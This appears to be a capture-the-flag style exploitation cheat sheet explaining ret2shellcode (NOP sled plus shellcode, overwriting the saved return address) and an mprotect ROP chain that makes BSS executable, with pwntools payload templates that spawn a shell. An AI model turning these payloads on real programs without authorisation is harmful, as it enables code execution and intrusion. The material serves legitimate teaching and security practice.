# ret2shellcode

**When:** NX is disabled (stack or a region is executable). Check with `checksec`.

**Prerequisites:**

- RWX memory region (stack or mmap'd)
- Address of shellcode area (stack leak or fixed address)

## How it works

Place executable shellcode in the overflowed buffer, then overwrite RIP to jump there. A NOP sled (`\x90`) before the shellcode gives you margin on the jump target.

```
Stack before overflow:
+------------------+
| buffer           |  <- buffer[0]
+------------------+
| ...              |
+------------------+
| saved RBP        |
+------------------+
| saved RIP        |
+------------------+

Stack after overflow:
+------------------+
| NOP sled (\x90)  |  <- shellcode area starts here
+------------------+
| shellcode        |
+------------------+
| more shellcode   |
+------------------+
| padding AAAA..   |
+------------------+
| padding          |  <- overwrites saved RBP
+------------------+
| &shellcode_area  |  <- overwrites saved RIP -> jumps to NOP sled
+------------------+
```

## Code

```python
sc = asm(shellcraft.sh())
nop_sled = b'\x90' * 32
pad_after = b'A' * (200 - len(nop_sled) - len(sc))

payload = flat({offset: [
    nop_sled,
    sc,
    pad_after,
    shellcode_addr     # address of the NOP sled (or start of buffer)
]})
```

## Finding shellcode address

If the stack address is leaked (format string, `printf("%p")`, etc.), use it directly. If no PIE and BSS is executable, use a fixed address.

```python
# Stack leak from program output
shellcode_addr = stack_leak + buffer_offset

# Or if binary leaks RSP at runtime:
# shellcode_addr = stack_leak - offset_to_buffer
```

## mprotect + shellcode

**When:** NX is on, but you can call `mprotect` to make a region executable.

**How it works:** ROP chain calls `mprotect(bss_page, size, RWX)` to make BSS writable+executable, then `read(0, bss, len)` to read actual shellcode, then `jmp bss` to execute it.

```
ROP chain:
[mprotect_ret]  <- after mprotect, continues here
[pop_rdi     ]  <- page aligned BSS address
[pop_rsi     ]  <- 0x1000 (size)
[pop_rdx     ]  <- 7 (RWX)
[mprotect@PLT]
[pop_rdi     ]  <- 0 (stdin)
[pop_rsi     ]  <- BSS address
[pop_rdx     ]  <- 0x400 (count)
[read@PLT    ]
[BSS address ]  <- jump to shellcode
```

```python
page = e.bss() & ~0xfff  # page-align BSS address
payload = flat({offset: [
    pop_rdi, page,
    pop_rsi, 0x1000,
    pop_rdx, 7,
    e.plt['mprotect'],    # mprotect(page, 0x1000, RWX)
    pop_rdi, 0,
    pop_rsi, e.bss(),
    pop_rdx, 0x400,
    e.plt['read'],        # read(0, bss, 0x400)
    e.bss(),              # jump to shellcode
]})
io.sendline(payload)
io.send(asm(shellcraft.sh()))
```
